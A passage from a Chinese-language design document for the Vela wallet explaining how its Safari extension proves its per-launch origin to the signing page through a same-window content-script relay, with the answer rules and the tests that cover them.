   实测三个不同的 UUID：`db8b4296…`、`8ae147fd…`、`4f68376d…`；`localStorage` 与 `storage.local` 跨这三次都还在，
   按扩展而不是按 origin 存）。`runtime.getURL` 给大写 UUID，浏览器报的 origin 是小写。**没有固定的 origin 可以列进白名单。**
3. **扩展页 `window.open` 出来的页面没有 `window.opener`。** 7.1 的 postMessage 无窗可答。

于是 Safari 走**同窗中继**（`lib/intake.js` `relayPeer`，只在 `?ch=post` 且没有 opener 时）：

- Vela 的内容脚本（`extension/safari/attest.js`，Safari 只在 `https://sign.getvela.app/*` 上注入它；开发包另加本机回环）
  在本页**自己的窗口**里说出扩展**此刻**的 origin：`{vela:'extension', origin}`。本页只听 `event.source === window`、
  本页 origin 的消息 —— 网站、别的窗口都发不出这种消息；只有本页自己的脚本和**被允许在本页运行的扩展**的内容脚本能。
  本页先问一句 `extension?`，等它在窗口里转一圈再说 `ready`，所以证明总在第一条意图之前到。
- 钱包（Safari 包的扩展页，`src/lib/extension/safari-signer.ts`）用 `tabs.create` 开本页，`tabs.sendMessage` 把消息交给
  内容脚本，内容脚本以 `{relay:'to-page', from:<扩展 origin>, …}` 投进本页；本页以 `{relay:'to-extension', …}` 投回窗口，
  内容脚本 `runtime.sendMessage` 交回钱包 —— 钱包只认那个标签页、按浏览器给的 `sender.url` 核对本页 origin。
- **答复规则**（`resolve.isSafariExtension`）：Safari 打开者被答复，当且仅当它的 origin（中继时是意图里写的 `from`）
  **逐字（不分大小写）等于本窗口里证明过的某一个**。证明过的才是钱包，签名与钥匙仪式都一样（`walletRequester`）；
  没有证明 → 本页不出卡（`ui.openerSilent`）；别的扩展 origin 的意图 → 听不见；`eth_sign` 照旧谁来都拒。
  Chrome 与网页钱包的 origin 仍是逐字白名单，证明不会放宽它们。

**为什么这不比原来宽**：能在本页窗口里发消息的扩展，本来就能改写本页的卡片、替人按按钮 —— 页面对浏览器在它里面
运行的代码没有任何规则可言。网站和没被允许在本页运行的扩展，既证明不了、也发不来中继消息。证明的 origin 只在本页
（官方页）说，不在别的网站说：它是一个按次启动的标识，不该交给陌生人。

**测试**：`bun samples/answer-test.mjs` 的 R 段（规则：证明过的 Safari origin 被答、没证明 / 别的 UUID / 带路径 / 非 UUID /
网站冒充都拒、`eth_sign` 拒、转来的站点是钱包的说法、仪式只认证明过的）与 S 段（发布出去的字节上，用 CDP 隔离世界
扮演内容脚本：没有 opener 时 `ready` 交给窗口里的扩展；证明过的扩展签了、答复经中继回来且是账户钥匙对本页摘要的签名；
没证明 → 不出卡；别的扩展的意图 → 听不见；`eth_sign` 的拒签经中继回来）；钱包一侧 `src/lib/extension/safari-signer.test.ts`；
iOS 模拟器上真机 Safari：`app-ios/VelaWallet/VelaWalletUITests/SafariExtensionDeviceTests.swift` 第 9、10 步。
